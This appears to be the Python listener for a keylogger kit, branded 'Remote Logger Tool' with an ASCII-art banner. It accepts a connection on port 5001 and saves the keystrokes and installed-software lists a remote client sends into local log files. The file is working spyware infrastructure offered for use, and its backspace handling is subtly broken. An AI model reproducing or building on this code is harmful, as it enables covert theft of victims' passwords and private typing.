import socket
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Server configuration
SERVER_HOST = '0.0.0.0'  # Listen on all available interfaces
SERVER_PORT = 5001
BUFFER_SIZE = 1024
SOFTWARE_LOG_FILE = "software_info.txt"
KEYLOG_FILE = "keylogs_with_timestamps.txt"

# Fancy banner display
print(Fore.RED + Style.BRIGHT + "     ██████ ▄▄▄█████▓ ██▀███   ██▓ ██ ▄█▀▓█████  ██▀███   ▒█████   ██▓███  ")
print(Fore.GREEN + Style.BRIGHT + " ▒██    ▒ ▓  ██▒ ▓▒▓██ ▒ ██▒▓██▒ ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒▒██▒  ██▒▓██░  ██▒")
print(Fore.YELLOW + Style.BRIGHT + " ░▓██▄   ▒ ▓██░ ▒░▓██ ░▄█ ▒▒██▒▓███▄░ ▒███   ▓██ ░▄█ ▒▒██░  ██▒▓██░ ██▓▒")
print(Fore.CYAN + Style.BRIGHT + "     ▒  ██▒░ ▓██▓ ░ ▒██▀▀█▄  ░██░▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  ▒██   ██░▒██▄█▓▒ ▒")
print(Fore.MAGENTA + Style.BRIGHT + "▒██████▒▒  ▒██▒ ░░██▓ ▒██▒░██░▒██▒ █▄░▒████▒░██▓ ▒██▒░ ████▓▒░▒██▒ ░  ░")
print(Fore.BLUE + Style.BRIGHT + "  ▒ ▒▓▒ ▒ ░  ▒ ░░   ░ ▒▓ ░▒▓░░▓  ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒░▒░▒░ ▒▓▒░ ░  ░")
print(Fore.LIGHTRED_EX + Style.BRIGHT + "░ ░▒  ░ ░    ░      ░▒ ░ ▒░ ▒ ░░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░  ░ ▒ ▒░ ░▒ ░     ")
print(Fore.LIGHTGREEN_EX + Style.BRIGHT + "░  ░  ░    ░        ░░   ░  ▒ ░░ ░░ ░    ░     ░░   ░ ░ ░ ░ ▒  ░░       ")
print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "      ░              ░      ░  ░  ░      ░  ░   ░         ░ ░             ")

print(Fore.LIGHTBLUE_EX + Style.BRIGHT + "+-------------------------------------------------------------------------------------+")
print(Fore.LIGHTMAGENTA_EX + Style.BRIGHT + "| Welcome to the Remote Logger Tool!                                                  |")
print(Fore.LIGHTCYAN_EX + "|                                                                                     |")
print(Fore.LIGHTGREEN_EX + Style.BRIGHT + "| This tool captures keystrokes and retrieves installed software information.          |")
print(Fore.LIGHTRED_EX + Style.BRIGHT + "| Developed by: Str1k3r0p                                                             |")
print(Fore.LIGHTYELLOW_EX + "| GitHub: https://github.com/Str1k3r0p                                                 |")
print(Fore.LIGHTBLUE_EX + Style.BRIGHT + "+-------------------------------------------------------------------------------------+")

print(Fore.RED + Style.BRIGHT + f"Server listening on {SERVER_HOST}:{SERVER_PORT}...")

# Start the server
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((SERVER_HOST, SERVER_PORT))
server_socket.listen(1)

# Accept a connection
client_socket, client_address = server_socket.accept()
print(Fore.GREEN + Style.BRIGHT + f"\nConnection established with {client_address}")

# Open log files
with open(SOFTWARE_LOG_FILE, "w") as software_file, open(KEYLOG_FILE, "w") as keylog_file:
    is_software_section = False
    log_buffer = []

    while True:
        # Receive data
        data = client_socket.recv(BUFFER_SIZE)
        if not data:
            break

        decoded_data = data.decode('utf-8')

        # Check for software info section
        if "[SOFTWARE INFO]" in decoded_data:
            is_software_section = True
        elif "[END SOFTWARE INFO]" in decoded_data:
            is_software_section = False
        elif is_software_section:
            # Plain text data handling, just append it to the file
            software_file.write(decoded_data)
            software_file.flush()  # Ensure it is written immediately
        else:
            # Process keylogs
            for char in decoded_data:
                if char == '\n':  # Newline
                    log_buffer.append('\n')
                elif char == '[BACKSPACE]':
                    if log_buffer:
                        log_buffer.pop()  # Remove last character
                else:
                    log_buffer.append(char)

            # Write updated log buffer to the file
            keylog_file.seek(0)
            keylog_file.truncate()
            keylog_file.write("".join(log_buffer))
            keylog_file.flush()

print(Fore.LIGHTRED_EX + "Connection closed.")
client_socket.close()
server_socket.close()
